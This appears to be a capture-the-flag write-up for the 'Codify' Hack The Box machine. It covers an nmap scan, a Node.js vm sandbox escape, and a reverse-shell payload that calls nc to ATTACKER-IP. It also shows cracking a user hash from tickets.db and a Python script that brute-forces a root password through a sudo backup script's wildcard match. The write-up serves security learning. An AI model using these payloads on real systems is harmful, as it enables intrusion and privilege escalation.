# **Codify**

***
![](https://miro.medium.com/v2/resize:fit:1400/1*-QJ-5jvRu70eWMRuKoluHw.png)

## **Difficulty = Easy**

***
Running our nmap scan we have

```bash
# Nmap 7.94 scan initiated Mon Nov  6 01:25:11 2023 as: nmap -p- -sVC -v --min-rate=1000 -T4 -oN nmap.txt 10.129.158.172
Increasing send delay for 10.129.158.172 from 0 to 5 due to 217 out of 542 dropped probes since last increase.
Increasing send delay for 10.129.158.172 from 5 to 10 due to 203 out of 507 dropped probes since last increase.
Warning: 10.129.158.172 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.158.172
Host is up (0.27s latency).
Not shown: 58108 closed tcp ports (conn-refused), 7424 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: POST
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  6 01:28:23 2023 -- 1 IP address (1 host up) scanned in 192.23 seconds
```


Navigating to port `80/HTTP` we have this


![](https://i.imgur.com/VTspSKB.png)

We can therefore add **codify.htb** to our `/etc/hosts` file

![](https://i.imgur.com/rAXsWeY.png)


Navigating back to **codify.htb** we have this website


![](https://i.imgur.com/hb521yc.png)


Clicking **Try it now** we have this **Node.js** sandbox as said earlier in the default page, so i tried out several payloads, but good enough this [blog](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html) helped me


![](https://i.imgur.com/KkuwgJv.png)


We can therefore get a reverse shell using the below payload (Make sure to replace **ATTACKER-IP** with your Ip address)


```bash
# on attacker machine
$ nc -lvnp 444

# on node.js editor

"use strict";
const vm = require("vm");
const xyz = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();
process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER-IP 4444 >/tmp/f').toString()`);
console.log(xyz);
```


We got shell as user `svc`


![](https://i.imgur.com/5np8SqW.png)


Navigating to `/var/www/contact` we have a file called `tickets.db` that contains user **joshua** hash (For better view use `strings` instead of `cat`)


![](https://i.imgur.com/oCS7otG.png)


We can then save this hash into a `.TXT` file on our attacker machine and attempt to crack it


![](https://i.imgur.com/j00477M.png)

We can therefore switch user to **joshua** with the `su` command


![](https://i.imgur.com/yHCFGqW.png)


Running `sudo -l` we have permissions to run `/opt/scripts/mysql-backup.sh` with sudo permissions


![](https://i.imgur.com/hMeg5hn.png)


Concatenating this script we can see what it does


![](https://i.imgur.com/UV9OY5m.png)

Basically it asks us for a user `root` **Mysql** password and if it is correct grants us read permissions to the `/var/backups/mysql` backup directory, After several testing i found out a particular python script by someone 🤣 that literally bruteforce the **Mysql** password


```python
import string  
import subprocess  
  
all_characters_and_numbers = list(string.ascii_letters + string.digits)  
  
password = ""  
found = False  
  
while not found:  
    for character in all_characters_and_numbers:  
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"  
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout  
  
        if "Password confirmed!" in output:  
            password += character  
            print(password)  
            break  
    else:  
        found = True
```

Which truly did gave us the password

![](https://i.imgur.com/RFkK7MC.png)


We can just switch user to `root` with this password instead of login in via **Mysql**

![](https://i.imgur.com/rh4PWdi.png)





<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>




